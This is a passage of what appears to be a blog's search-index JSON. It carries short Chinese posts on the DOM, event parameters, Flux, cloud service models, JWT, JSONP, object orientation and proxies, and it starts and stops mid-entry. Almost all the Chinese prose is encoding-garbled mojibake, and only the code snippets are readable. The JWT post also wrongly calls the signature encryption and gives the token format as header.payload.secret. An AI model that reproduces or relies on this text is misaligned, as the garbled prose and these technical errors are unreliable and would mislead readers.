è£¡å®šç¾©å¥½çš„æ–¹æ³• querySelector: function(selector) { ... }} åŒ–æˆåœ–ç‰‡ï¼š èƒ½åšä»€éº¼ï¼Ÿè®“æˆ‘å€‘å¯ä»¥é€é JavaScript ä¾†å­˜å– HTML åšä¸€äº›æ“ä½œï¼Œåƒæ˜¯ã€Œæ”¹è®Šç•«é¢ã€ä¹‹é¡çš„ã€‚ å„˜ç®¡å¯«çš„æ˜¯ JavaScript çš„èªæ³•ä½†å»èƒ½æ“ä½œ HTMLã€‚å› æ­¤ä¹Ÿå¯ä»¥æŠŠ DOM æƒ³æˆæ˜¯ç€è¦½å™¨æä¾›çš„ä¸€å€‹ã€Œæ©‹æ¢ã€ï¼Œç”¨ JavaScript ä¾†è·Ÿç€è¦½å™¨æºé€šï¼Œé€é DOM ä¾†å‘Šè¨´ç€è¦½å™¨æˆ‘å€‘æƒ³å° HTML åšä»€éº¼ã€‚","link":"/2022/01/18/what-is-dom/"},{"title":"é—œæ–¼ event(e)","text":"ä»¥å‰é‚„è »é™Œç”Ÿçš„æ±è¥¿ã€‚ ç°¡è¿°ç€è¦½å™¨åœ¨å¹«æˆ‘å€‘å‘¼å« callback function æ™‚ï¼Œä»–æœƒå‚³å…¥ä¸€å€‹åƒæ•¸ï¼ševent é€™è£¡é¢æœƒæ”¾å¾ˆå¤šè·Ÿäº‹ä»¶æœ‰é—œçš„æ±è¥¿ï¼Œä¾‹å¦‚èªªï¼š 123456const btn = document.querySelector('.btn')// event åªæ˜¯å€‹åƒæ•¸ï¼Œæ‰€ä»¥ä½ æƒ³å–ä»€éº¼åå­—éƒ½è¡Œ// ä¾‹å¦‚ï¼šfunction(yoyoyo) ä¹Ÿæ˜¯ OK çš„btn.addEventListener('click', function(event) { console.log(event)}) Outputï¼š 12345678910111213// PointerEvent { isTrusted: true altKey: false altitudeAngle: 1.5707963267948966 azimuthAngle: 0 bubbles: true button: 0 buttons: 0 cancelBubble: false cancelable: true ...} æœ‰é»æŠ½è±¡çš„è©±å¯ä»¥æƒ³æˆé€™æ¨£å­ï¼š 123456789101112131415161718192021const btn = document.querySelector('.btn')btn.addEventListener('click', onClick)function onClick(event) { console.log(event)}// ç€è¦½å™¨å‘¼å« callback function çš„æ™‚å€™onClick({ isTrusted: true altKey: false altitudeAngle: 1.5707963267948966 azimuthAngle: 0 bubbles: true button: 0 buttons: 0 cancelBubble: false cancelable: true ...}) event.targeté€™æ˜¯æœ€å¸¸ç”¨åˆ°çš„ä¸€å€‹æ±è¥¿ï¼Œç”¨ä¾†å‘Šè¨´ä½ ã€Œæ˜¯å“ªä¸€å€‹å…ƒç´ è§¸ç™¼äº‹ä»¶ï¼ˆæœ€ç›´æ¥çš„é‚£å€‹ï¼‰ã€ æ²¿ç”¨å‰›å‰›çš„ä¾‹å­ï¼š 1234const btn = document.querySelector('button')btn.addEventListener('click', function(event) { console.log(event.target)}) Outputï¼š 1&lt;button&gt;Click me&lt;/button&gt;","link":"/2022/01/18/what-is-event-parameter/"},{"title":"ä»€éº¼æ˜¯ Fluxï¼Ÿ","text":"ä¸€å€‹ç¾ä»£å‰ç«¯æ¡†æ¶çš„ä¸å¯æˆ–ç¼ºçš„è§€å¿µã€‚ ç°¡è¿°Flux æ˜¯ä¸€ç¨®ã€Œç®¡ç†ç‹€æ…‹çš„æ¶æ§‹ã€ã€‚ åœ¨ Flux æ¨å‡ºä¹‹å‰ï¼Œå…¶å¯¦æ¯å€‹æ¡†æ¶æˆ–æ˜¯ library éƒ½æœ‰å„è‡ªç®¡ç†ç‹€æ…‹çš„æ–¹å¼ï¼š åœ¨ jQuery æ˜¯ã€Œç›´æ¥å»æ”¹è®Šç•«é¢ã€ åœ¨ React æ˜¯ã€Œå–®å‘è³‡æ–™æµã€ï¼ˆåªç®¡ stateï¼‰ åœ¨ Angular æˆ– Vue æ˜¯ã€Œé›™å‘ç¶å®šã€ï¼ˆæ”¹ç•«é¢ or æ”¹è³‡æ–™ï¼‰ ç„¶è€Œç•¶å°ˆæ¡ˆè¶Šä¾†è¶Šå¤§æ™‚ï¼Œç‹€æ…‹ç®¡ç†å°±æœƒè®Šå¾—è¶Šè¤‡é›œï¼Œå–®é åŸæœ¬çš„æ–¹å¼å…¶å¯¦æœƒæœ‰ä¸€äº›å•é¡Œï¼Œæ‰€ä»¥è‡‰æ›¸å¾Œä¾†å°±æ¨å‡ºäº† Flux é€™å¥—æ¶æ§‹ä¾†è§£æ±ºã€‚ æƒ³çŸ¥é“è‡‰æ›¸ç•¶æ™‚ç¢°åˆ°ä»€éº¼å•é¡Œè·Ÿ Flux æ›´å¤šçš„ç´°ç¯€å¯ä»¥åƒè€ƒé€™éƒ¨å½±ç‰‡ ç¸½ä¹‹å‘¢ï¼Œä»¥ React ä¾†èªªï¼Œæˆ‘å€‘åŸæœ¬åœ¨æ“ä½œ state çš„æ–¹å¼æ˜¯é€™æ¨£å­ï¼š view é»äº†æŸå€‹æŒ‰éˆ• -&gt; æ›´æ–° state -&gt; view æ”¶åˆ°æ–°çš„ state é™„è¨»ï¼šview æŒ‡çš„å°±æ˜¯ Reactï¼Œç•¢ç«Ÿå®ƒæœ¬ä¾†å°±æŠŠè‡ªå·±å®šç¾©æˆä¸€å€‹ UI åº«ã€‚ è€Œè®Šæˆ Flux ä»¥å¾Œçš„æµç¨‹æ˜¯ï¼š view é»äº†æŸå€‹æŒ‰éˆ• -&gt; dispatch ä¸€å€‹ action -&gt; store è£¡çš„ reducer æ ¹æ“š action å›å‚³æ–°çš„ state -&gt; view æ”¶åˆ°æ–°çš„ state çœ‹èµ·ä¾†å¤šäº†ä¸€å¤§å †ç¹ç‘£çš„æ­¥é©Ÿï¼Œä½†é€™æ¨£å­åšå…¶å¯¦æ˜¯æœ‰åŸå› çš„ï¼Œå¯ä»¥å…ˆåƒè€ƒä¸‹é¢é€™å…©å¼µåœ–ï¼š 1. MVC æ¶æ§‹ä¸‹çš„æµç¨‹ 2. Flux æ¶æ§‹ä¸‹çš„æµç¨‹ ç°¡å–®ä¾†èªªï¼Œåœ¨ MVC è£¡é¢ä»»ä½•äººéƒ½å¯ä»¥éš¨ä¾¿å»æ”¹ stateï¼Œä½†åœ¨ Flux ä¸‹å°±ä¸è¡Œäº†ï¼Œä¸ç®¡è¦åšä»€éº¼å¾—é€é action + dispatch ä¾†åšã€‚ åœ¨æ²’æœ‰æ¡ç”¨ Flux é€™ç¨®æ¶æ§‹æ™‚ï¼Œè¦è¿½è¹¤å•é¡Œé»æœƒå¾ˆå›°é›£ï¼Œå› ç‚ºå¤§å®¶éƒ½å¯ä»¥ç›´æ¥å»æ”¹ stateï¼Œå°±æœƒå¾ˆé›£çŸ¥é“æ˜¯èª°æ”¹çš„ï¼Ÿä»€éº¼æ™‚å€™æ”¹çš„ï¼Ÿ ä½†æ˜¯ç•¶æ¡ç”¨äº† Flux ä»¥å¾Œï¼Œè¦è¿½è¹¤ bug æ™‚å°±èƒ½æœ‰ä¸€å€‹ç›´æ¥çš„ç·šç´¢ï¼Œåƒæ˜¯ã€ŒæŸå€‹ action æ˜¯å¾å“ªå€‹ view ç™¼å‡ºçš„ï¼Ÿã€æˆ–æ˜¯ã€Œstate æ˜¯è¢«å“ªå€‹ action æ”¹çš„ï¼Ÿã€ç­‰ç­‰ã€‚ æ‰€ä»¥é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼å¾Œä¾†è‡‰æ›¸æœƒæ¡ç”¨ Flux çš„åŸå› ï¼Œå…¶å¯¦å›æ­¸åˆ°åŸé»é‚„æ˜¯ç‚ºäº†ç®¡ç†ç‹€æ…‹è€Œå·²ã€‚","link":"/2022/04/23/what-is-flux/"},{"title":"ç†è§£é‚£äº›äº”èŠ±å…«é–€çš„å°ˆæœ‰åè©ï¼šIaaSã€PaaS å’Œ SaaS","text":"å®ƒå€‘å¤ªå¸¸å‡ºç¾äº†ï¼Œæ‰€ä»¥æ±ºå®šä¸€æ¬¡æŠŠå®ƒå€‘ææ‡‚ã€‚ ç°¡è¿°é€™äº›å°ˆæœ‰åè©éƒ½æ˜¯æŒ‡è·Ÿã€Œé›²ç«¯ã€æœ‰é—œçš„æœå‹™ï¼Œæ‰€ä»¥åªæœ‰è·Ÿã€Œé›²ç«¯ã€æœ‰é—œçš„æœå‹™æ‰æœƒç”¨é€™äº›è©ã€‚ Infrastructure as a Serviceï¼ˆIaaSï¼‰ è¨­æ–½å³æœå‹™AWS çš„ EC å°±æ˜¯å±¬æ–¼é€™ä¸€é¡å‹ã€‚åªæä¾›ä½ ç¡¬é«”è¨­å‚™ï¼ˆè™›æ“¬ä¸»æ©Ÿï¼‰ï¼Œä½†ä½œæ¥­ç³»çµ±ï¼Œä¼ºæœå™¨è»Ÿé«”çš„è¨­å®šä½ éƒ½å¾—è‡ªå·±ä¾†ã€‚ å¥½è™•æ˜¯å½ˆæ€§å¾ˆå¤§ï¼Œç¼ºé»æ˜¯æ²’æœ‰ç¨‹å¼èƒŒæ™¯å’Œä¸€äº›ç¶²è·¯é‹ä½œæ¦‚å¿µçš„è©±æœƒç”¨åˆ°æƒ³å“­ã€‚ Platform as a Serviceï¼ˆPaaSï¼‰ å¹³å°å³æœå‹™Heroku æˆ– Google App Engine å±¬æ–¼é€™é¡å‹ã€‚ä½ åªè¦æŠŠå°ˆæ¡ˆä¸Ÿä¸Šå»å°±å¥½ï¼Œå…¶ä»–ä½œæ¥­ç³»çµ±ã€ä¼ºæœå™¨è»Ÿé«”éƒ½ä¸ç”¨æ“”å¿ƒï¼Œå¹³å°æœƒå¹«ä½ è™•ç†å¥½ã€‚ å¥½è™•æ˜¯ç°¡å–®è¼•é¬†ï¼Œç¼ºé»æ˜¯æ²’è¾¦æ³•ä¾ç…§å€‹äººå–œå¥½åšç´°éƒ¨èª¿æ•´ã€‚ Software as a Serviceï¼ˆSaaSï¼‰ è»Ÿé«”å³æœå‹™ç°¡å–®ä¾†èªªå°±æ˜¯ã€Œç¾æˆçš„è»Ÿé«”æœå‹™ã€ï¼Œä¾‹å¦‚ Gmail æˆ– Office 365ã€‚ æˆ‘çœ‹ç¶²è·¯ä¸Šçš„è¬›è§£éƒ½è¦ºå¾—æœ‰é»æ¨¡ç³Šï¼Œæ‰€ä»¥æˆ‘èˆ‰ä¸€å€‹æ¯”è¼ƒç°¡å–®çš„ä¾‹å­ï¼š å…ˆæƒ³æƒ³çœ‹ï¼Œå¦‚æœä½ æƒ³è¦æœ‰å€‹è·Ÿ Gmail ä¸€æ¨£åœ¨ç¶²è·¯ä¸Šå¯„ä¿¡çš„åŠŸèƒ½ï¼Œé‚£ä½ è©²æ€éº¼åšï¼Ÿ ä½ è¦å…ˆæœ‰ä¸€å°ç¡¬é«”è¨­å‚™ï¼ˆä¹Ÿå°±æ˜¯ä¸»æ©Ÿï¼‰ï¼Œä¾†æ­å»ºä¼ºæœå™¨ ä½ éœ€è¦å»ºç«‹ä¸€å€‹ Server ç¨‹å¼ï¼Œä¾†è™•ç†å¯„ä¿¡å’Œæ”¶ä¿¡çš„ request ä¹‹é¡çš„ ä½ éœ€è¦å¯«ä¸€å€‹ä¿¡ä»¶è»Ÿé«”çš„æ‡‰ç”¨ç¨‹å¼ å¥½ï¼Œèªªåˆ°é€™é‚Šæ˜¯è¦å‘Šè¨´ä½ ï¼ŒSaaS å°±æ˜¯è² è²¬å¹«ä½ æŠŠä»¥ä¸Šé€™äº›å…¨éƒ¨éƒ½åŒ…è¾¦å¥½ï¼Œä½ ä»€éº¼éƒ½ä¸ç”¨æ“å¿ƒï¼Œåªè¦è¨˜å¾—ã€Œä»˜éŒ¢ã€ï¼Œç„¶å¾Œã€Œäº«å—æœå‹™ã€å°±å¥½äº†ã€‚","link":"/2022/03/11/what-is-iaas-paas-and-saas/"},{"title":"é—œæ–¼ JWTï¼ˆJSON-Web-Tokenï¼‰","text":"ä¸€æ¨£å›ä¾†å¡«å‘ã€‚ ä»€éº¼æ˜¯ JSON Web Tokenï¼Ÿå…¶å¯¦ç°¡å–®ä¾†èªªå°±æ˜¯ï¼š ç”¨ JSON æ ¼å¼çš„è³‡æ–™ç”¢ç”Ÿå‡ºçš„ Token å› ç‚ºé€™æ±è¥¿ç¶“å¸¸æ‡‰ç”¨åœ¨ Web ä¸Šï¼Œæ‰€ä»¥å°±ç°¡ç¨±ç‚ºã€ŒJWTã€äº†ã€‚æˆ‘å€‘å¯ä»¥å…ˆä¾†çœ‹ä¸€å€‹ JWT é•·æ€éº¼æ¨£ï¼š å¯ä»¥çœ‹åˆ°æˆ‘åˆ†æˆå…©å€‹å€å¡Šï¼Œç´…è‰²å€å¡Šæ˜¯ã€Œç·¨ç¢¼å’ŒåŠ å¯†ã€å¾Œçš„çµæœï¼Œä¹Ÿå°±æ˜¯å¯¦éš› Token çš„æ¨¡æ¨£ï¼›è—è‰²çš„éƒ¨åˆ†å‰‡æ˜¯åŸå§‹è³‡æ–™ï¼Œæ˜¯é€™å€‹ Token æ‰€å¯Œå«çš„è³‡è¨Šï¼Œè€Œä¸”å°±æ˜¯ JSON çš„è³‡æ–™æ ¼å¼ã€‚ æ­£å¦‚æˆ‘æ‰€èªªï¼ŒJWT çš„èƒŒå¾Œå°±åªæ˜¯æŠŠ JSON è³‡æ–™ç¶“éç·¨ç¢¼å’ŒåŠ å¯†å¾Œå†ç•¶æˆ Token ä¾†ç”¨è€Œå·²ï¼Œä¸ç”¨æƒ³å¾—å¤ªè¤‡é›œã€‚ JWT çš„çµ„æˆå†ä¾†çœ‹ä¸€æ¬¡é€™å¼µåœ–ï¼š é€™æ¬¡ä¸è¦ç®¡æ¡†ç·šï¼Œè€Œæ˜¯æ³¨æ„ã€Œæ–‡å­—é¡è‰²ã€çš„éƒ¨åˆ†ã€‚ ç´…å­—äº‚ç¢¼æœƒå°æ‡‰åˆ°å³é‚Šçš„ HEADERï¼Œæ˜¯ç¶“é base64 ç·¨ç¢¼å‰çš„æ¨¡æ¨£ ç´«å­—äº‚ç¢¼æœƒå°æ‡‰åˆ°å³é‚Šçš„ PAYLOADï¼Œæ˜¯ç¶“é base64 ç·¨ç¢¼å‰çš„æ¨¡æ¨£ æ·¡è—å­—äº‚ç¢¼çš„éƒ¨åˆ†å‰‡å°æ‡‰åˆ°å³é‚Šçš„ SIGNATUREï¼Œæ˜¯ç¶“éåŠ å¯†å‰çš„æ¨¡æ¨£ é™„è¨»ï¼šä½ å¯ä»¥è©¦è‘—æŠŠç´…å­—äº‚ç¢¼ï¼ˆeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9ï¼‰è·Ÿç´«å­—äº‚ç¢¼ï¼ˆeyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlBlYU51IiwiaWF0IjoxNTE2MjM5MDIyfQï¼‰çš„éƒ¨åˆ†æ‹¿å» é€™è£¡ åš base64 è§£ç¢¼ï¼Œå°±æœƒæ‡‚æˆ‘çš„æ„æ€äº†ã€‚ æ·¡è—å­—çš„éƒ¨åˆ†æ¯”è¼ƒç‰¹åˆ¥æ‰€ä»¥æˆ‘å¤šè£œå……ä¸€ä¸‹ï¼Œé€™å€‹åœ°æ–¹å«åšã€Œç°½ç« ã€ï¼Œæ˜¯ JWT æœ€é‡è¦çš„éƒ¨åˆ†ã€‚ ç°¡å–®ä¾†èªªå°±æ˜¯ç”¨ä¸‹é¢é€™å€‹å…¬å¼ä¾†ç®—å‡ºæœ€å¾Œçš„ Tokenï¼š 1HMACSHA256(base64UrlEncode(header) + '.' + base64UrlEncode(payload), secret) å–®çœ‹é€™æ®µ code æ‡‰è©²å°±è »æ¸…æ¥šäº†ï¼Œç¸½ä¹‹å°±æ˜¯å…ˆç¶“é base64 ç·¨ç¢¼å¾Œåœ¨æ‹¼æ¥èµ·ä¾†åšåŠ å¯†ï¼Œæ‰€ä»¥æœ€å¾Œçš„å€¼æ‰æœƒæ˜¯ header.payload.secret é€™æ¨£çš„æ ¼å¼ã€‚ è‡³æ–¼ secret çš„éƒ¨åˆ†å‰‡æ˜¯å¾Œç«¯è‡ªå·±å®šç¾©çš„ä¸€å€‹å€¼ï¼ˆå¯ä»¥æ˜¯ä»»ä½•æ–‡å­—ï¼‰ï¼Œç¸½ä¹‹é‡é»å°±æ˜¯çµ•å°ä¸èƒ½è®“åˆ¥äººçŸ¥é“é€™å€‹å€¼æ˜¯ä»€éº¼ï¼Œä¸ç„¶åˆ¥äººå°±å¯ä»¥å½é€  JWT äº†ã€‚ ç•¢ç«Ÿä½ çœ‹åˆ°ç¾åœ¨æœƒç™¼ç¾æ•´å€‹ JWT çœŸæ­£æœ‰è¢«åŠ å¯†çš„åœ°æ–¹åªæœ‰ secret é€™ä¸€æ®µè€Œå·²ï¼Œheader è·Ÿ payload éƒ½åªæ˜¯ç´”ç²¹çš„ base64 ç·¨ç¢¼ï¼Œåªè¦æ‹¿å»è§£ç¢¼å°±å¯ä»¥çŸ¥é“å…§å®¹æ˜¯ä»€éº¼ã€‚ æ¥ä¸‹ä¾†ä»‹ç´¹ä¸€ä¸‹ Headerã€Payloadã€Secret é€™ä¸‰å€‹ key å¯ä»¥æ”¾äº›ä»€éº¼å…§å®¹ã€‚ Header alg åŠ å¯†çš„æ¼”ç®—æ³•ï¼Œå¯ä»¥æ˜¯ HMACã€SHA256ã€RSA typ Token çš„ typeï¼Œå¤§å¤šæ•¸æƒ…æ³ä¸‹åªæœƒå¡« JWT ç¯„ä¾‹ï¼š 1234{ \"alg\": \"HS256\", \"typ\": \"JWT\"} Payloadç°¡å–®ä¾†èªªé€™é‚Šæ˜¯è®“ä½ ã€Œæ”¾ä¸€äº›è¨Šæ¯çš„åœ°æ–¹ã€ï¼Œè¡“èªä¸Šæœƒç¨±ä½œã€Œè²æ˜ï¼ˆClaimï¼‰ã€ï¼Œä½†æˆ‘è¦ºå¾—çŸ¥é“ä¸€ä¸‹å°±å¥½ï¼Œå°±ç®—è¨˜ä¸å¾—ä¹Ÿæ²’é—œä¿‚ã€‚ é€™é‚Šæœƒåˆ—å‡ºå¹¾å€‹å±¬æ–¼ã€Œæ¨™æº–è¦ç¯„ï¼ˆRegistered claimsï¼‰ã€ä¸­çš„å…§å®¹ï¼ˆæ„æ€å°±æ˜¯å»ºè­°ä½ æ”¾ï¼Œä½†ä¸æ”¾ä¹Ÿæ²’é—œä¿‚å•¦ï¼‰ issï¼ˆIssuerï¼‰èª°ç™¼çš„ JWT expï¼ˆExpiration Timeï¼‰JWT çš„éæœŸæ™‚é–“ subï¼ˆSubjectï¼‰é€™å€‹ JWT çš„æ‰€æœ‰äººï¼ˆé¡ä¼¼ä½œè€…çš„æ¦‚å¿µå§ï¼‰ audï¼ˆAudienceï¼‰é æœŸèª°æœƒæ¥æ”¶é€™å€‹ JWT nbfï¼ˆNot Beforeï¼‰JWT çš„ç”Ÿæ•ˆæ™‚é–“ iatï¼ˆIssued Atï¼‰JWT çš„å»ºç«‹æ—¥æœŸ jtiï¼ˆJWT Idï¼‰JWT è‡ªèº« çš„ IDï¼ˆä¸å¯é‡è¤‡ï¼‰ é™¤äº†é€™äº›ä»¥å¤–ï¼Œä½ ä¹Ÿå¯ä»¥å®šç¾©è‡ªå·±çš„è²æ˜ï¼ˆPrivate claimsï¼‰ï¼Œåƒæ˜¯ nameã€admin ä¹‹é¡çš„ã€‚ ç¯„ä¾‹ï¼š 12345{ \"sub\": \"1234567890\", // Registered \"account\": \"kenny@example.com\", // Private \"role\": \"admin\" // Private} Secretå‰›å‰›æœ‰èªªéï¼Œé€™éƒ¨åˆ†å°±æ˜¯è®“å¾Œç«¯è‡ªå®šç¾©çš„å­—ä¸²ï¼Œæ¥è‘—å†è·Ÿç·¨ç¢¼å¾Œçš„ header + payload ä¾†çµ„åˆå¾Œå†æ‹¿å»åŠ å¯†ã€‚ 1HMACSHA256(base64UrlEncode(header) + '.' + base64UrlEncode(payload), secret) é‚„æ˜¯åœ¨å¼·èª¿ä¸€æ¬¡ï¼Œé€™å€‹ secret çµ•å°ä¸èƒ½æ´©æ¼å‡ºå»ï¼Œä¸ç„¶å°±æ²’æœ‰ä»»ä½•æ„ç¾©äº†ã€‚ JWT æ€éº¼ç”¨ï¼Ÿ ç”¨ä½¿ç”¨è€…çš„å¸³è™Ÿå¯†ç¢¼æ‰“å¾Œç«¯çš„ APIï¼Œé€šéå¾Œå°±æœƒæ‹¿åˆ° JWT å‰ç«¯æŠŠ JWT çš„å…§å®¹å­˜åœ¨ localStorage ç•¶å‰ç«¯è¦å­˜å–è·Ÿæ¬Šé™æœ‰é—œçš„è³‡æºæ™‚ï¼ŒåŠ ä¸Šåº•ä¸‹çš„ request header 1Authorization: Bearer &lt;JWT token&gt; å¾Œç«¯æª¢æŸ¥è©² JWT æ˜¯å¦æœ‰æ•ˆï¼Œæœ‰æ•ˆçš„è©±å°±çµ¦è³‡æºï¼Œå¦å‰‡å°±æ‹’çµ• åƒè€ƒè³‡æ–™ JWT(JSON Web Token) â€” åŸç†ä»‹ç´¹ JSON Web Token Claims","link":"/2022/06/24/what-is-json-web-token/"},{"title":"ä»€éº¼æ˜¯ JSONP","text":"ç´€éŒ„ä¸€ä¸‹ï½ ç°¡è¿°ä¸€å€‹ç‚ºäº†è§£æ±ºã€Œè·¨ç¶²åŸŸæ‹¿è³‡æ–™ã€çš„å•é¡Œè€Œèª•ç”Ÿçš„å°æŠ€å·§ã€‚ ä¸€èˆ¬åœ¨å–å¾—å¤–éƒ¨è³‡æ–™æ™‚æˆ‘å€‘æœƒç”¨ fetch æˆ–è€…æ˜¯ XMLHttpRequest ä¹‹é¡çš„æ–¹å¼ä¾†ç™¼å‡º requestï¼Œä½†å¦‚æœæ˜¯ JSONP çš„è©±æˆ‘å€‘æœƒä½¿ç”¨ &lt;script src=\"xxx\"&gt; ä¾†ç™¼ requestã€‚ ç¬¬ä¸€æ¬¡è½åˆ°çš„äººå¯èƒ½æœƒè¦ºå¾—ï¼šã€Œè›¤ï¼Œç‚ºä»€éº¼è¦é€™æ¨£å­åšï¼Ÿã€ é€™æ˜¯å› ç‚ºé€é &lt;script&gt; å–å¾—çš„è³‡æ–™ä¸æœƒæœ‰è·¨åŸŸé™åˆ¶ã€‚æ€è€ƒä¸€ä»¶äº‹æƒ…ï¼Œä½ åœ¨ç”¨ &lt;script&gt; å»å¼•å…¥å¥—ä»¶æ™‚ï¼Œæœ‰å“ªä¸€æ¬¡æœƒç¢°åˆ°ç€è¦½å™¨è·Ÿä½ èªªæœ‰è·¨åŸŸå•é¡Œçš„å—ï¼Ÿæ²’æœ‰å§ï¼æ‰€ä»¥é€™å°±æ˜¯ JSONP èƒŒå¾Œçš„æ¦‚å¿µã€‚ ç„¶è€Œï¼Œé€™å€‹ &lt;script&gt; å›å‚³çš„å…§å®¹æ¯”è¼ƒç‰¹åˆ¥ï¼Œå¯èƒ½æœƒé•·å¾—åƒé€™æ¨£ï¼š 123456/* å‘¼å« callbackï¼Œä¸¦å‚³å…¥ä¸€å€‹ Object */callback({ name: 'PeaNu', age: 20, gender: 'man'}) æœ‰æ²’æœ‰è¦ºå¾—å¾ˆçœ¼ç†Ÿï¼Ÿä¸å°±æ˜¯ callback function å—ï¼Ÿåªæ˜¯ä½ åœ¨å‰ç«¯å¯«çš„ callback é€šå¸¸æ˜¯é•·é€™æ¨£ï¼š 1234/* æˆ‘é æœŸé€™å€‹ callback åŸ·è¡Œæ™‚æœƒè¢«å‚³å…¥ä¸€å€‹ response */function callback(response) { console.log(response)} æŠŠé€™å…©å€‹é †åºå°èª¿ä¸¦å¯«åœ¨ä¸€èµ·ï¼Œå¥½åƒå°±æ˜¯ä½ å¾ˆç†Ÿæ‚‰çš„ JavaScript äº†ï¼š 12345678function callback(response) { console.log(response)}callback({ name: 'PeaNu', age: 20, gender: 'man'}) ä¹Ÿå°±æ˜¯èªªåªè¦å…ˆå®šç¾©å¥½ callbackï¼Œæ¥è‘—ç­‰äººä¾†å¹«ä½ å‘¼å«ä¸‹é¢é‚£ä¸€æ®µå°±èƒ½åœ¨ callback è£¡é¢æ‹¿åˆ°è³‡æ–™äº†ï¼ é‚£è¦æ€éº¼å‘¼å«ï¼Ÿå°±æ˜¯é€é &lt;script&gt;ï¼š 1234567891011121314151617&lt;!-- client ç«¯ --&gt;&lt;script&gt; /* æˆ‘é æœŸé€™å€‹ callback åŸ·è¡Œæ™‚æœƒè¢«å‚³å…¥ä¸€å€‹ response */ function callback(response) { console.log(response) }&lt;/script&gt;&lt;!-- server ç«¯ --&gt;&lt;script src=\"https://example.com\"&gt; /* æœ‰äººç™¼ request ä¾†æˆ‘å°± response ä¸‹é¢é€™æ®µ */ callback({ name: 'PeaNu', age: 20, gender: 'man' })&lt;/script&gt; é€™å€‹å°±å«åš JSONPï¼Œå› ç‚ºæ˜¯æŠŠè³‡æ–™ã€Œå¡«å……ï¼ˆPaddingï¼‰ã€åœ¨ function è£¡é¢æ•…å¾—å…¶åã€‚ æœ€å¾Œå†è¤‡ç¿’ä¸€æ¬¡ã€‚ä¹‹æ‰€ä»¥è¦é€™æ¨£åšæ˜¯å› ç‚º &lt;script&gt; ä¸­çš„ src ä¸æœƒæœ‰è·¨ç¶²åŸŸçš„é™åˆ¶ï¼Œå°±è·Ÿä½ ç”¨ &lt;img src=\"xxx\"&gt; ä¸€æ¨£ï¼Œå®ƒä¸æœƒå»ç®¡ä»€éº¼ç¶²åŸŸçš„å•é¡Œï¼Œå› æ­¤æœ‰äººå°±åˆ©ç”¨é€™å€‹ç‰¹æ€§ç™¼æ˜äº† JSONPã€‚ è€å¯¦èªªé‚„çœŸä½©æœé€™å€‹äººçš„è…¦è¢‹è£äº†ä»€éº¼ï¼Œå¯ä»¥é€™éº¼æ©Ÿæ™ºã€‚ æœ‰èˆˆè¶£äº†è§£æ›´å¤šçš„è©±å¯ä»¥åƒè€ƒæˆ‘ä¹‹å‰å¯«çš„çš„æ–‡ç« ï¼šå¯¦ä½œ JSONPï¼Œé€™è£¡é¢è§£é‡‹äº†å‰å¾Œç«¯åˆ°åº•å¯¦éš›ä¸Šåšäº†ä»€éº¼ã€‚","link":"/2022/01/29/what-is-jsonp/"},{"title":"ä»€éº¼æ˜¯ç‰©ä»¶å°å‘","text":"ç¶“éå¦‚æ­¤å¤šå¹´ï¼Œæˆ‘æ‰çœŸæ­£èªè­˜å®ƒã€‚ ç°¡è¿°ç‰©ä»¶å°å‘çš„ç‰¹é»å°±æ˜¯éƒ½æœƒæœ‰å€‹ã€Œå°è±¡ã€ï¼Œæœ€æ˜é¡¯çš„åœ°æ–¹æ˜¯ã€Œå‘¼å« function çš„æ–¹å¼ã€ã€‚ ä¸‹é¢æ˜¯ä¸€å€‹ç”¨ã€Œé–‰åŒ…ã€å¯¦ä½œå‡ºä¾†çš„ç¯„ä¾‹ã€‚é›–ç„¶ä¸æ˜¯æ­£è¦ä½œæ³•ï¼Œä½†åŒ…å«äº†ç‰©ä»¶å°å‘çš„ç†å¿µï¼š 12345678910111213function createWallet(initMoney) { let money = initMoney return { deduct: (value) =&gt; { value &gt; 100 ? (money -= 100) : (money -= value) }, show: () =&gt; console.log(money) }}const myWallet = createWallet(1000)// å° myWallet é€™å€‹å°è±¡myWallet.deduct(1000)myWallet.show() é€™ç¨®å° xxx åšæŸä»¶äº‹çš„è¡Œç‚ºå°±ç¨±ç‚ºã€Œç‰©ä»¶å°å‘ã€ï¼Œä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªï¼Œä¸ç®¡æ˜¯ deduct é‚„æ˜¯ showï¼Œéƒ½æ˜¯åœ¨å° myWallet é€™å€‹å°è±¡ä¾†åŸ·è¡Œã€‚æ‰€ä»¥ç‰©ä»¶å°å‘åŸºæœ¬ä¸Šéƒ½æœƒæœ‰ä¸€å€‹æ˜ç¢ºçš„å°è±¡ã€‚ å¦‚æœä¸æ˜¯ç‰©ä»¶å°å‘çš„è©±ï¼Œå°±æœƒåƒä¸‹é¢é€™æ¨£ï¼Œé€éç›´æ¥å‘¼å« function çš„æ–¹å¼ä¾†å®Œæˆï¼š 12deduct(1000)show() ç‚ºä»€éº¼è¦ç‰©ä»¶å°å‘ï¼Ÿåœ¨ç‰©ä»¶å°å‘çš„ä¸–ç•Œå“©ï¼ŒæœƒæŠŠæ¯æ¨£æ±è¥¿éƒ½çœ‹æˆæ˜¯ä¸€å€‹ä¸€å€‹çš„ã€Œå°è±¡ï¼ˆæ¨¡çµ„ï¼‰ã€ï¼Œé€™æ¨£çš„å¥½è™•æœ‰å¹¾é»ï¼š æ¯”è¼ƒå¥½ç®¡ç†ï¼ˆæ¨¡çµ„åŒ–ï¼‰ å¯ä»¥é¿å…æœ‰äººç›´æ¥æ“æ§è®Šæ•¸ä¹‹é¡çš„å•é¡Œã€‚","link":"/2022/03/18/what-is-oop/"},{"title":"ä»€éº¼æ˜¯æ­£å‘ä»£ç†èˆ‡åå‘ä»£ç†","text":"ä¸€å€‹å¾ˆäººæ€§åŒ–çš„è¨­è¨ˆã€‚ æ­£å‘ä»£ç†å…¶å¯¦ä¸è¤‡é›œï¼Œåªè¦ä½ èƒ½ç†è§£æ­£å‘ä»£ç†çš„æ„æ€ï¼Œé‚£åå‘ä»£ç†é¦¬ä¸Šå°±èƒ½æ‡‚ï¼Œå› ç‚ºçœŸçš„åªæ˜¯ã€Œåéä¾†ã€è€Œå·²ã€‚ å…ˆä¾†çœ‹ä¸€ä¸‹ä»€éº¼æ˜¯æ­£å‘ä»£ç†ï¼š ç°¡å–®ä¾†èªªï¼Œæœ‰äº›æ™‚å€™ä½ æƒ³é€ è¨ªçš„ç¶²ç«™æœƒã€Œæ“‹ 